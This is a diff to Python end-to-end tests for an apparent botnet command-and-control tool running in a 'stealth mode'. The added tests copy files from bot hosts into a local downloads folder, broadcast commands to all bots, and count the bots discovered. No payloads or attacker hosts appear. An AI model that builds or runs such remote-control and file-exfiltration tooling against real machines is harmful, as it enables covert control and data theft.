@@ -298,22 +298,48 @@ class TestStealthE2E:
         assert "uid=" in response["output"]
     
     def test_stealth_copy_small_file(self, stealth_test_client):
-        """Test file copy in stealth mode with content verification."""
+        """Test file copy in stealth mode with download verification."""
         test_content = "SECRET_DATA_12345_STEALTH"
         
         with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
             f.write(test_content)
             temp_path = f.name
         
+        filename = os.path.basename(temp_path)
+        downloads_dir = "downloads"
+        local_path = os.path.join(downloads_dir, filename)
+        
         try:
+            # Clean up if exists from previous run
+            if os.path.exists(local_path):
+                os.unlink(local_path)
+            
             stealth_test_client.send_command("ALL", "copy", temp_path)
             response = stealth_test_client.wait_for_response(timeout=60)
             
             assert response is not None, "Should receive file copy response"
             assert "FILE_START:" in response["output"]
             assert test_content in response["output"], f"File content not found in: {response['output'][:100]}"
+            
+            # Simulate controller's file saving logic
+            lines = response["output"].split('\n', 1)
+            if len(lines) >= 2:
+                file_content = lines[1]
+                if file_content.endswith("\nFILE_END"):
+                    file_content = file_content[:-9]
+                
+                os.makedirs(downloads_dir, exist_ok=True)
+                with open(local_path, 'wb') as f:
+                    f.write(file_content.encode('utf-8'))
+                
+                # Verify saved file matches original
+                with open(local_path, 'r') as f:
+                    saved_content = f.read()
+                assert saved_content == test_content, "Saved file content should match original"
         finally:
             os.unlink(temp_path)
+            if os.path.exists(local_path):
+                os.unlink(local_path)
     
     def test_stealth_copy_medium_file(self, stealth_test_client):
         """Test copying a medium file (~500 bytes) in stealth mode."""
@@ -416,6 +442,37 @@ class TestStealthE2E:
         
         assert response is not None
         assert "Unknown Cmd" in response["output"]
+
+    def test_stealth_copy_nonexistent_file(self, stealth_test_client):
+        """Test copying nonexistent file in stealth mode."""
+        stealth_test_client.send_command("ALL", "copy", "/nonexistent/path.txt")
+        response = stealth_test_client.wait_for_response(timeout=30)
+        
+        assert response is not None
+        assert "File not found" in response["output"]
+    
+    def test_stealth_all_bots_respond(self, stealth_test_client):
+        """All bots should respond to ping in stealth mode."""
+        stealth_test_client.send_command("ALL", "ping")
+        responses = stealth_test_client.wait_for_responses(count=3, timeout=60)
+        
+        assert len(responses) >= 1, "Should receive at least one response"
+        for resp in responses:
+            assert resp["output"] == "Pong"
+    
+    def test_stealth_discover_multiple_bots(self, stealth_test_client):
+        """Discover multiple bots in stealth mode."""
+        stealth_test_client.send_command("ALL", "ping")
+        stealth_test_client.wait_for_responses(count=3, timeout=60)
+        
+        assert len(stealth_test_client.discovered_bots) >= 1, "Should discover at least one bot"
+    
+    def test_stealth_all_target(self, stealth_test_client):
+        """Test ALL target is received in stealth mode."""
+        stealth_test_client.send_command("ALL", "ping")
+        response = stealth_test_client.wait_for_response(timeout=30)
+        
+        assert response is not None
 
 
 if __name__ == "__main__":
